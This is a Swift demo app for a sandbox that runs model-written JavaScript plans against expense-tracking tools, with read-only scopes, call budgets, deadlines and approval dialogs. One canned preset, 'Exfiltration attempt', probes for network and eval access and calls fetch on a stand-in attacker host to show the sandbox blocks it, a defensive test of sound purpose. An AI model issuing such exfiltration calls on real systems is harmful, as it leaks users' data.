import SwiftUI
import Charts
import CodeModeKit

// The app owns its domain and its tools. CodeModeKit owns the runtime, the
// bridge, the policy and the JavaScriptCore sandbox. The scripts below are canned
// plans of the kind a model writes; this demo does not call a model, so every
// result on screen is reproducible.

@main
struct CodeModeDemoApp: App {
    var body: some Scene {
        WindowGroup { RootView() }
    }
}

// MARK: - Domain

struct ExpenseRecord: Codable, Sendable, Identifiable, Equatable {
    let id: Int
    let merchant: String
    let category: String
    let cents: Int
    let month: String
    var flagged: Bool
}

enum StoreError: ModelFacingError {
    case notFound(Int)
    var modelFacingMessage: String {
        switch self { case .notFound(let id): return "no expense with id \(id)" }
    }
}

actor ExpenseStore {
    static let seed: [ExpenseRecord] = [
        .init(id: 1, merchant: "Blue Bottle", category: "food", cents: 650, month: "2026-11", flagged: false),
        .init(id: 2, merchant: "Blue Bottle", category: "food", cents: 650, month: "2026-11", flagged: false),
        .init(id: 3, merchant: "Eurostar", category: "travel", cents: 18_900, month: "2026-11", flagged: false),
        .init(id: 4, merchant: "Figma", category: "software", cents: 1_500, month: "2026-11", flagged: false),
        .init(id: 5, merchant: "Dishoom", category: "food", cents: 7_400, month: "2026-11", flagged: false),
        .init(id: 6, merchant: "Uber", category: "travel", cents: 2_300, month: "2026-10", flagged: false),
        .init(id: 7, merchant: "Figma", category: "software", cents: 1_500, month: "2026-10", flagged: false),
        .init(id: 8, merchant: "Pret", category: "food", cents: 890, month: "2026-10", flagged: false),
    ]
    static let budgets: [String: Int] = ["food": 6_000, "travel": 25_000, "software": 3_000]

    private(set) var records = ExpenseStore.seed

    func list(month: String) -> [ExpenseRecord] { records.filter { $0.month == month } }

    func flag(id: Int) throws {
        guard let index = records.firstIndex(where: { $0.id == id }) else { throw StoreError.notFound(id) }
        records[index].flagged = true
    }

    func delete(id: Int) throws {
        guard let index = records.firstIndex(where: { $0.id == id }) else { throw StoreError.notFound(id) }
        records.remove(at: index)
    }

    func reset() { records = ExpenseStore.seed }
}

// MARK: - Tools (typed Swift, exposed to scripts as `tools.<name>`)

struct ExpenseRow: Codable, Sendable {
    let id: Int; let merchant: String; let category: String; let cents: Int; let flagged: Bool
}
struct Ack: Codable, Sendable { let ok: Bool }

struct ListExpenses: CodeModeTool {
    static let descriptor = ToolDescriptor(
        name: "listExpenses", summary: "Expenses recorded in a month (YYYY-MM)", tier: .read,
        input: .object([SchemaField("month", .string)]),
        output: .array(.object([
            SchemaField("id", .integer), SchemaField("merchant", .string), SchemaField("category", .string),
            SchemaField("cents", .integer), SchemaField("flagged", .boolean),
        ]))
    )
    struct Input: Codable, Sendable { let month: String }
    let store: ExpenseStore
    func call(_ input: Input) async throws -> [ExpenseRow] {
        await store.list(month: input.month).map {
            ExpenseRow(id: $0.id, merchant: $0.merchant, category: $0.category, cents: $0.cents, flagged: $0.flagged)
        }
    }
}

struct CategoryBudgets: CodeModeTool {
    static let descriptor = ToolDescriptor(
        name: "categoryBudgets", summary: "Monthly budget per category, in cents", tier: .read,
        input: .object([]),
        output: .array(.object([SchemaField("category", .string), SchemaField("limitCents", .integer)]))
    )
    struct Input: Codable, Sendable {}
    struct Budget: Codable, Sendable { let category: String; let limitCents: Int }
    func call(_ input: Input) async throws -> [Budget] {
        ExpenseStore.budgets.sorted { $0.key < $1.key }.map { Budget(category: $0.key, limitCents: $0.value) }
    }
}

struct FlagExpense: CodeModeTool {
    static let descriptor = ToolDescriptor(
        name: "flagExpense", summary: "Marks an expense for review (undoable)", tier: .write,
        input: .object([SchemaField("id", .integer), SchemaField("reason", .string)]),
        output: .object([SchemaField("ok", .boolean)])
    )
    struct Input: Codable, Sendable { let id: Int; let reason: String }
    let store: ExpenseStore
    func call(_ input: Input) async throws -> Ack {
        try await store.flag(id: input.id)
        return Ack(ok: true)
    }
}

struct DeleteExpense: CodeModeTool {
    static let descriptor = ToolDescriptor(
        name: "deleteExpense", summary: "Permanently deletes an expense", tier: .destructive,
        input: .object([SchemaField("id", .integer)]),
        output: .object([SchemaField("ok", .boolean)])
    )
    struct Input: Codable, Sendable { let id: Int }
    let store: ExpenseStore
    func call(_ input: Input) async throws -> Ack {
        try await store.delete(id: input.id)
        return Ack(ok: true)
    }
}

// MARK: - Plans a model might write

struct Preset: Identifiable, Hashable {
    let id: String
    let title: String
    let readOnly: Bool
    let script: String

    static let all: [Preset] = [
        Preset(id: "review", title: "Monthly review (parallel)", readOnly: false, script: """
        const [nov, oct, budgets] = await Promise.all([
          tools.listExpenses({ month: "2026-11" }),
          tools.listExpenses({ month: "2026-10" }),
          tools.categoryBudgets({}),
        ]);
        const spent = {};
        for (const e of nov) spent[e.category] = (spent[e.category] || 0) + e.cents;
        const over = budgets.filter(b => (spent[b.category] || 0) > b.limitCents);
        for (const b of over) {
          const biggest = nov.filter(e => e.category === b.category)
                             .sort((a, c) => c.cents - a.cents)[0];
          if (biggest) await tools.flagExpense({ id: biggest.id, reason: "over " + b.category + " budget" });
        }
        const total = xs => xs.reduce((s, e) => s + e.cents, 0);
        return { novCents: total(nov), octCents: total(oct), overBudget: over.map(b => b.category) };
        """),
        Preset(id: "dedupe", title: "Delete duplicates (asks you)", readOnly: false, script: """
        const nov = await tools.listExpenses({ month: "2026-11" });
        const seen = new Set();
        const removed = [];
        for (const e of nov) {
          const key = e.merchant + "|" + e.cents;
          if (seen.has(key)) {
            try { await tools.deleteExpense({ id: e.id }); removed.push(e.id); }
            catch (err) { return { removed, stopped: String(err) }; }
          }
          seen.add(key);
        }
        return { removed };
        """),
        Preset(id: "exfil", title: "Exfiltration attempt", readOnly: true, script: """
        const probes = {
          fetch: typeof fetch, XMLHttpRequest: typeof XMLHttpRequest,
          setTimeout: typeof setTimeout, eval: typeof eval, require: typeof require,
        };
        try { await fetch("https://attacker.example/steal"); probes.sent = true; }
        catch (e) { probes.sent = false; probes.error = String(e); }
        return probes;
        """),
        Preset(id: "runaway", title: "Runaway loop", readOnly: true, script: """
        let n = 0;
        for (;;) { await tools.listExpenses({ month: "2026-11" }); n++; }
        """),
        Preset(id: "scope", title: "Write in a read-only run", readOnly: true, script: """
        const nov = await tools.listExpenses({ month: "2026-11" });
        await tools.flagExpense({ id: nov[0].id, reason: "suspicious" });
        return "flagged";
        """),
    ]

    static func named(_ id: String?) -> Preset {
        all.first { $0.id == id } ?? all.first ?? Preset(id: "empty", title: "Empty", readOnly: true, script: "return null;")
    }
}

// MARK: - Confirmation (a human in the loop for destructive tools)

@MainActor @Observable
final class ConfirmationCenter {
    struct Pending: Identifiable {
        let request: ConfirmationRequest
        let continuation: CheckedContinuation<ConfirmationDecision, Never>
        var id: Int { request.id }
    }
    private(set) var queue: [Pending] = []
    private var accepting = false
    var current: ConfirmationRequest? { queue.first?.request }

    func beginRun() { accepting = true }

    func ask(_ request: ConfirmationRequest) async -> ConfirmationDecision {
        // A request that hops to the main actor after its run ended is denied
        // without showing a dialog (the bridge would refuse it anyway).
        guard accepting else { return .denied }
        return await withCheckedContinuation { queue.append(Pending(request: request, continuation: $0)) }
    }

    func answer(_ decision: ConfirmationDecision) {
        guard !queue.isEmpty else { return }
        queue.removeFirst().continuation.resume(returning: decision)
    }

    /// Called when a run ends: anything still waiting is denied, so no continuation
    /// is leaked (the bridge already refuses it because the run was revoked).
    func denyAll() {
        accepting = false
        let pending = queue
        queue = []
        pending.forEach { $0.continuation.resume(returning: .denied) }
    }
}

struct DialogConfirmations: ConfirmationProvider {
    let center: ConfirmationCenter
    func confirm(_ request: ConfirmationRequest) async -> ConfirmationDecision {
        await center.ask(request)
    }
}

// MARK: - View model

@MainActor @Observable
final class DemoModel {
    let store: ExpenseStore
    let confirmations: ConfirmationCenter
    private let runtime: CodeModeRuntime?
    let setupError: String?

    var preset: Preset { didSet { script = preset.script; readOnly = preset.readOnly } }
    var script: String
    var readOnly: Bool
    var maxToolCalls = 12
    var deadlineSeconds = 20
    private(set) var isRunning = false
    private(set) var report: RunReport?
    private(set) var records: [ExpenseRecord] = ExpenseStore.seed
    private var didAutorun = false

    var scope: CapabilityScope { readOnly ? .readOnly : CapabilityScope() }

    init(presetID: String?) {
        let initial = Preset.named(presetID)
        preset = initial
        script = initial.script
        readOnly = initial.readOnly
        let store = ExpenseStore()
        let confirmations = ConfirmationCenter()
        self.store = store
        self.confirmations = confirmations
        var registry = ToolRegistry()
        do {
            try registry.register(ListExpenses(store: store))
            try registry.register(CategoryBudgets())
            try registry.register(FlagExpense(store: store))
            try registry.register(DeleteExpense(store: store))
            runtime = CodeModeRuntime(registry: registry, confirmations: DialogConfirmations(center: confirmations)) {
                JavaScriptCoreEngine()
            }
            setupError = nil
        } catch {
            runtime = nil
            setupError = "Tool registration failed: \(error)"
        }
    }

    func declarations(readOnly: Bool) async -> String {
        await runtime?.declarations(in: readOnly ? .readOnly : CapabilityScope()) ?? (setupError ?? "")
    }

    /// `-autorun YES` launch argument: run the selected preset once on first appearance.
    func autorunOnce() async -> Bool {
        guard UserDefaults.standard.bool(forKey: "autorun"), !didAutorun else { return false }
        didAutorun = true
        await run()
        return true
    }

    func run() async {
        guard let runtime, !isRunning else { return }
        isRunning = true
        let budget = ExecutionBudget(maxToolCalls: maxToolCalls, deadline: .seconds(deadlineSeconds))
        confirmations.beginRun()
        let result = await runtime.run(script, scope: scope, budget: budget)
        confirmations.denyAll()
        report = result
        records = await store.records
        isRunning = false
    }

    func resetData() async {
        await store.reset()
        records = await store.records
        report = nil
    }
}

// MARK: - Views

struct RootView: View {
    @State private var model = DemoModel(presetID: UserDefaults.standard.string(forKey: "preset"))
    @State private var tab = UserDefaults.standard.string(forKey: "tab") ?? "run"

    var body: some View {
        TabView(selection: $tab) {
            RunView(model: model)
                .tabItem { Label("Run", systemImage: "play.rectangle") }
                .tag("run")
            ManifestView(model: model)
                .tabItem { Label("Manifest", systemImage: "doc.plaintext") }
                .tag("manifest")
            CostView()
                .tabItem { Label("Cost model", systemImage: "chart.xyaxis.line") }
                .tag("cost")
        }
    }
}

struct RunView: View {
    @Bindable var model: DemoModel

    var body: some View {
        NavigationStack {
            ScrollViewReader { proxy in
                Form {
                    if let error = model.setupError {
                        Section { Text(error).foregroundStyle(.red) }
                    }
                    Section("Plan") {
                        Picker("Preset", selection: $model.preset) {
                            ForEach(Preset.all) { Text($0.title).tag($0) }
                        }
                        TextEditor(text: $model.script)
                            .font(.system(.caption, design: .monospaced))
                            .autocorrectionDisabled()
                            .textInputAutocapitalization(.never)
                            .frame(minHeight: 150, maxHeight: 190)
                    }
                    Section("Policy") {
                        Toggle("Read-only scope", isOn: $model.readOnly)
                        Stepper("Tool-call budget: \(model.maxToolCalls)", value: $model.maxToolCalls, in: 1...50)
                        Stepper("Deadline: \(model.deadlineSeconds)s", value: $model.deadlineSeconds, in: 1...30)
                        Button {
                            Task { await model.run(); proxy.scrollTo("outcome", anchor: .top) }
                        } label: {
                            Label(model.isRunning ? "Running…" : "Run in sandbox", systemImage: "play.fill")
                        }
                        .disabled(model.isRunning)
                    }
                    if let report = model.report {
                        OutcomeSection(report: report).id("outcome")
                        TraceSection(trace: report.trace)
                    }
                    DataSection(records: model.records) { Task { await model.resetData() } }
                }
                .navigationTitle("Code Mode")
                .task {
                    if await model.autorunOnce() { proxy.scrollTo("outcome", anchor: .top) }
                }
            }
        }
        .alert("Allow this tool call?", isPresented: Binding(
            get: { model.confirmations.current != nil },
            set: { _ in }
        ), presenting: model.confirmations.current) { _ in
            Button("Deny", role: .cancel) { model.confirmations.answer(.denied) }
            Button("Approve", role: .destructive) { model.confirmations.answer(.approved) }
        } message: { request in
            Text("\(request.tool) [\(request.tier.description)]\n\(request.arguments)\n\(request.summary)")
        }
    }
}

struct OutcomeSection: View {
    let report: RunReport

    var body: some View {
        Section("Outcome") {
            HStack {
                Image(systemName: symbol).foregroundStyle(color)
                Text(title).bold()
            }
            Text(detail)
                .font(.system(.caption, design: .monospaced))
                .textSelection(.enabled)
            LabeledContent("Tool calls", value: "\(report.executedCalls) ran · \(report.attemptedCalls) counted against budget")
            LabeledContent("Elapsed", value: report.elapsed.formatted(.units(allowed: [.milliseconds], width: .abbreviated)))
            if report.orphanedCalls > 0 {
                LabeledContent("Still running at end", value: "\(report.orphanedCalls)")
            }
        }
    }

    private var title: String {
        switch report.outcome {
        case .completed: return "Completed"
        case .scriptFailed: return "Script failed"
        case .budgetExhausted: return "Stopped: tool-call budget"
        case .deadlineExceeded: return "Stopped: deadline"
        case .rejected: return "Rejected"
        case .cancelled: return "Cancelled"
        }
    }

    private var detail: String {
        switch report.outcome {
        case .completed(let value): return value.canonicalText()
        case .scriptFailed(let message), .rejected(let message): return message
        case .budgetExhausted: return "The first call over budget revoked the run."
        case .deadlineExceeded: return "The run was revoked at the deadline."
        case .cancelled: return "The run was cancelled."
        }
    }

    private var symbol: String {
        if case .completed = report.outcome { return "checkmark.seal.fill" }
        return "hand.raised.fill"
    }

    private var color: Color {
        if case .completed = report.outcome { return .green }
        return .orange
    }
}

struct TraceSection: View {
    let trace: RunTrace

    var body: some View {
        Section("Trace (\(trace.events.count) events\(trace.droppedEvents > 0 ? ", \(trace.droppedEvents) dropped" : ""))") {
            if trace.events.isEmpty {
                Text("No tool calls.").foregroundStyle(.secondary)
            }
            ForEach(trace.events.prefix(40), id: \.sequence) { event in
                HStack(alignment: .firstTextBaseline, spacing: 8) {
                    Text("#\(event.ordinal)").font(.caption.monospacedDigit()).foregroundStyle(.secondary)
                    Text(Self.describe(event.kind)).font(.system(.caption, design: .monospaced))
                }
            }
            if trace.events.count > 40 {
                Text("… \(trace.events.count - 40) more").foregroundStyle(.secondary)
            }
        }
    }

    static func describe(_ kind: TraceEvent.Kind) -> String {
        switch kind {
        case .requested(let tool, let arguments): return "→ \(tool)(\(arguments))"
        case .confirmationRequested: return "⏸ waiting for you"
        case .confirmationResolved(let approved): return approved ? "✓ approved" : "✕ denied"
        case .succeeded(let result): return "← " + String(result.prefix(90))
        case .failed(let failure): return "✕ \(failure.code.rawValue): \(failure.message)"
        case .lateResultDropped: return "⌫ late result dropped"
        }
    }
}

struct DataSection: View {
    let records: [ExpenseRecord]
    let reset: () -> Void

    var body: some View {
        Section {
            ForEach(records) { record in
                HStack {
                    Text("\(record.id)").font(.caption.monospacedDigit()).foregroundStyle(.secondary)
                    Text(record.merchant)
                    Spacer()
                    if record.flagged { Image(systemName: "flag.fill").foregroundStyle(.orange) }
                    Text(record.month).font(.caption).foregroundStyle(.secondary)
                    Text(Double(record.cents) / 100, format: .currency(code: "GBP")).monospacedDigit()
                }
            }
            Button("Reset data", role: .destructive, action: reset)
        } header: {
            Text("App data (\(records.count) expenses, \(records.filter(\.flagged).count) flagged)")
        }
    }
}

struct ManifestView: View {
    let model: DemoModel
    @State private var readOnly = false
    @State private var text = ""

    var body: some View {
        NavigationStack {
            Form {
                Picker("Scope", selection: $readOnly) {
                    Text("Full").tag(false)
                    Text("Read-only").tag(true)
                }
                .pickerStyle(.segmented)
                Section("What the model is told it can call") {
                    Text(text)
                        .font(.system(.caption, design: .monospaced))
                        .textSelection(.enabled)
                }
                Section("Why this is safe") {
                    Text("The script gets one frozen `tools` object and nothing else: no fetch, timers, eval or modules. Out-of-scope tools are absent, not just refused. Destructive tools always pause for you, and an approval that arrives after the deadline never runs.")
                        .font(.callout)
                }
            }
            .navigationTitle("Tool manifest")
            .task(id: readOnly) { text = await model.declarations(readOnly: readOnly) }
        }
    }
}

struct CostView: View {
    @State private var resultTokens = 600.0
    @State private var parallelism = 4.0
    private let model = OrchestrationCostModel()

    struct Point: Identifiable {
        let calls: Int
        let strategy: String
        let tokens: Int
        var id: String { "\(strategy)-\(calls)" }
    }

    private var workload: OrchestrationCostModel.Workload {
        OrchestrationCostModel.Workload(resultTokensPerCall: Int(resultTokens), parallelism: Int(parallelism))
    }

    private var points: [Point] {
        (1...16).flatMap { calls -> [Point] in
            var w = workload
            w.toolCalls = calls
            return [
                Point(calls: calls, strategy: "Classic tool use", tokens: model.classic(w).inputTokens),
                Point(calls: calls, strategy: "Code mode", tokens: model.codeMode(w).inputTokens),
            ]
        }
    }

    var body: some View {
        NavigationStack {
            Form {
                Section("Input tokens vs tool calls") {
                    Chart(points) { point in
                        LineMark(x: .value("Tool calls", point.calls), y: .value("Input tokens", point.tokens))
                            .foregroundStyle(by: .value("Strategy", point.strategy))
                            .symbol(by: .value("Strategy", point.strategy))
                    }
                    .frame(height: 220)
                }
                Section("Workload") {
                    VStack(alignment: .leading) {
                        Text("Tokens per tool result: \(Int(resultTokens))")
                        Slider(value: $resultTokens, in: 50...3_000, step: 50)
                    }
                    VStack(alignment: .leading) {
                        Text("Script parallelism: \(Int(parallelism))")
                        Slider(value: $parallelism, in: 1...8, step: 1)
                    }
                }
                Section("At 8 calls") {
                    let classic = model.classic(workload)
                    let code = model.codeMode(workload)
                    LabeledContent("Classic", value: "\(classic.inputTokens.formatted()) in · \(classic.modelTurns) turns · \(classic.latencyMilliseconds.formatted()) ms")
                    LabeledContent("Code mode", value: "\(code.inputTokens.formatted()) in · \(code.modelTurns) turns · \(code.latencyMilliseconds.formatted()) ms")
                    LabeledContent("Input break-even", value: model.inputBreakEven(workload).map { "\($0) calls" } ?? "never (≤64)")
                }
                Section {
                    Text("A model, not a measurement: classic mode re-reads every earlier result each turn and runs calls one at a time; prompt caching (ignored here) narrows the gap, and a wrong script costs a retry that this chart does not show.")
                        .font(.footnote)
                        .foregroundStyle(.secondary)
                }
            }
            .navigationTitle("Cost model")
        }
    }
}
